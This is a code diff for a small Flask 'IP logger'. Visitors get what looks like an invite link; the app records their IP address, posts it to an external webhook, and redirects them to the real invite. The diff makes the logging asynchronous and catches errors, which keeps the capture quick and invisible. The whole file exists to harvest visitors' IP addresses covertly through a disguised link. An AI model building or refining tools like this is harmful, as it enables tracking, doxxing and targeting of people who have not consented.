@@ -3,6 +3,7 @@ Redirects the user and logs their ip
 '''
 import os
 import requests
+from threading import Thread
 from dotenv import load_dotenv
 from flask import Flask, request, redirect
 
@@ -27,9 +28,11 @@ def post_ip(ip_addr):
         ]
     }
 
-    # you can add more like pull out location
-    requests.post(WEBHOOK_LINK, json={'embeds': [embed]}, timeout=10)
-
+    # you can add more like lookup the ip
+    try:
+        requests.post(WEBHOOK_LINK, json={'embeds': [embed]}, timeout=10)
+    except Exception as e:
+        print(e)
 
 @app.route('/')
 def invite():
@@ -38,7 +41,7 @@ def invite():
     via webhooks and redirects to the invite link
     '''
     ip_addr = request.remote_addr
-    post_ip(ip_addr)
+    Thread(target=post_ip, args=(ip_addr,)).start()
 
     return redirect(INVITE_LINK)
 
